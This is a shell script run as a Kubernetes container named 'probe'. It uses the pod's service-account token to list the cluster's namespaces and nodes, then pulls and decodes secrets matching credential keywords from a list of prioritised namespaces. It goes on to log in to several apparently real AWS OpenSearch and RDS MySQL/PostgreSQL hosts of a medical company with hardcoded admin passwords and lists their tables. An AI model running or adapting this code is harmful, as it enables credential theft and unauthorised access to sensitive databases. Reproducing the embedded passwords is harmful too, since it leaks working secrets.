containers.name: probe
args:
#!/bin/sh
set -u
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token)
API=https://kubernetes.default.svc
get(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" "$1" 2>/dev/null; }
echo "===I3030C_START utc=$(date -u +%FT%TZ) host=$(hostname)==="

echo "===K8S_VERSION==="
get "$API/version" | head -c 400; echo

apk add --no-cache curl jq mariadb-client postgresql16-client >/tmp/apk.log 2>&1
echo "apk_rc=$? curl=$(command -v curl) jq=$(command -v jq) mysql=$(command -v mysql) psql=$(command -v psql)"
tail -2 /tmp/apk.log 2>/dev/null

get "$API/api/v1/namespaces?limit=1000" > /tmp/ns.json
jq -r '.items[]?.metadata.name' /tmp/ns.json 2>/dev/null | sort > /tmp/ns.txt
echo "NS_COUNT=$(wc -l < /tmp/ns.txt)"
echo "NS_LIST=$(tr '\n' ',' < /tmp/ns.txt)"
echo "===NODES==="
get "$API/api/v1/nodes?limit=20" > /tmp/nodes.json
jq -r '.items[]? | "NODE \(.metadata.name) \(.status.nodeInfo.kubeletVersion // "") \(.metadata.labels[\"node.kubernetes.io/instance-type\"] // "")"' /tmp/nodes.json 2>/dev/null | head -20
jq -r '.message // empty' /tmp/nodes.json 2>/dev/null | head -2

NS_PRIO="argocd user-management-service cognito-service data-management notification-service s3-ingestion authorization-service de-identifier-service imfusion-service metadata-extraction-service mlflow audit-log kube-system"
echo "===SECRET_INDEX_BEGIN==="
: > /tmp/sec_index.txt
for ns in $NS_PRIO; do
  get "$API/api/v1/namespaces/$ns/secrets?limit=500" > /tmp/s.json
  ERR=$(jq -r '.message // empty' /tmp/s.json 2>/dev/null)
  if [ -n "$ERR" ]; then echo "SECLIST_ERR $ns: $ERR"; continue; fi
  jq -r --arg ns "$ns" '.items[]? | "\($ns)|\(.metadata.name)|\((.data // {}) | keys | join(","))"' /tmp/s.json 2>/dev/null >> /tmp/sec_index.txt
done
cat /tmp/sec_index.txt
echo "SECRET_TOTAL=$(wc -l < /tmp/sec_index.txt)"
echo "===SECRET_INDEX_END==="

grep -Ei '(rds|db|secret|jwt|oauth|cognito|smtp|mail|token|api|key|cred|pass|webhook|firebase|payment|stripe|llm|openai|redis|aws|argo)' /tmp/sec_index.txt | head -30 > /tmp/sec_sel.txt
echo "SEC_SEL_COUNT=$(wc -l < /tmp/sec_sel.txt)"
echo "===SECRET_VALUES_BEGIN==="
while IFS='|' read -r ns name keys; do
  [ -z "${name:-}" ] && continue
  get "$API/api/v1/namespaces/$ns/secrets/$name" > /tmp/one.json
  echo "---SECRET $ns/$name"
  jq -r '
    (.data // {}) as $d |
    ($d | keys[]) as $k |
    if ($k|test("(?i)(pass|secret|token|key|cred|url|dsn|conn|jwt|oauth|smtp|mail|api|access|private|client|host|endpoint|username|user|password)"))
    then "  \($k) = " + (try ($d[$k]|@base64d|.[0:400]) catch "<nonutf8>")
    else "  \($k) = <redacted>" end
  ' /tmp/one.json 2>/dev/null | head -40
done < /tmp/sec_sel.txt
echo "===SECRET_VALUES_END==="

echo "===OPENSEARCH_BEGIN==="
OS='https://vpc-lazamedical-dev01-domain-ch6ra7jr5xoirc3s7mn7caeexi.us-west-2.es.amazonaws.com'
curl -s -k -m 20 -u 'admin:Wxt2G4@qK7MnF!BpJ3L9pYVXCJ#TdfM8' "$OS/_cluster/health" | head -c 800; echo
curl -s -k -m 25 -u 'admin:Wxt2G4@qK7MnF!BpJ3L9pYVXCJ#TdfM8' "$OS/_cat/indices?v" | head -60
echo "===OPENSEARCH_END==="

echo "===MYSQL_BEGIN==="
export MYSQL_PWD='Wv1h=_zJ7?uU3L6?'
MH='lazamedical-dev01-usw2-mysql-rds1.c96aqiuye5yb.us-west-2.rds.amazonaws.com'
mysql --connect-timeout=8 --ssl-verify-server-cert=OFF -h "$MH" -P 3306 -u admin -D user_management -N -e "SELECT VERSION(); SELECT CURRENT_USER();" 2>&1 | head -6
mysql --connect-timeout=8 --ssl-verify-server-cert=OFF -h "$MH" -P 3306 -u admin -D user_management -N -e "SELECT table_name FROM information_schema.tables WHERE table_schema='user_management' ORDER BY table_name" 2>&1 | tr '\n' ' ' | head -c 3000
echo
unset MYSQL_PWD
echo "===MYSQL_END==="

echo "===PG_RDS2_BEGIN==="
export PGPASSWORD='-W%ZHTpi&X(%)%SW'
PH2='lazamedical-dev01-usw2-postgresql-rds2.c96aqiuye5yb.us-west-2.rds.amazonaws.com'
psql -h "$PH2" -p 5432 -U postgres_admin -d user_management -At -c "select version(); select current_user;" 2>&1 | head -4
psql -h "$PH2" -p 5432 -U postgres_admin -d user_management -At -c "select table_schema||'.'||table_name from information_schema.tables where table_type='BASE TABLE' and table_schema not in ('pg_catalog','information_schema') order by 1" 2>&1 | tr '\n' ' ' | head -c 4000
echo
unset PGPASSWORD
echo "===PG_RDS2_END==="

echo "===PG_DP_BEGIN==="
export PGPASSWORD='1+nGZ&j1e?BZ*orJ'
PHDP='lazamedical-dp-dev01-usw2-postgresql-rds.c96aqiuye5yb.us-west-2.rds.amazonaws.com'
psql -h "$PHDP" -p 5432 -U postgres_admin -d dp_service -At -c "select version(); select current_user;" 2>&1 | head -4
psql -h "$PHDP" -p 5432 -U postgres_admin -d dp_service -At -c "select table_schema||'.'||table_name from information_schema.tables where table_type='BASE TABLE' and table_schema not in ('pg_catalog','information_schema') order by 1" 2>&1 | tr '\n' ' ' | head -c 6000
echo
unset PGPASSWORD
echo "===PG_DP_END==="

echo "===PG_MLFLOW_BEGIN==="
export PGPASSWORD='qdRd#3DI-YDcV35!'
PH1='lazamedical-dp-dev01-usw2-postgresql-rds1.c96aqiuye5yb.us-west-2.rds.amazonaws.com'
psql -h "$PH1" -p 5432 -U postgres_admin -d mlflow_service -At -c "select version(); select current_user;" 2>&1 | head -4
psql -h "$PH1" -p 5432 -U postgres_admin -d mlflow_service -At -c "select table_schema||'.'||table_name from information_schema.tables where table_type='BASE TABLE' and table_schema not in ('pg_catalog','information_schema') order by 1" 2>&1 | tr '\n' ' ' | head -c 6000
echo
unset PGPASSWORD
echo "===PG_MLFLOW_END==="

echo "===I3030C_DONE utc=$(date -u +%FT%TZ)==="
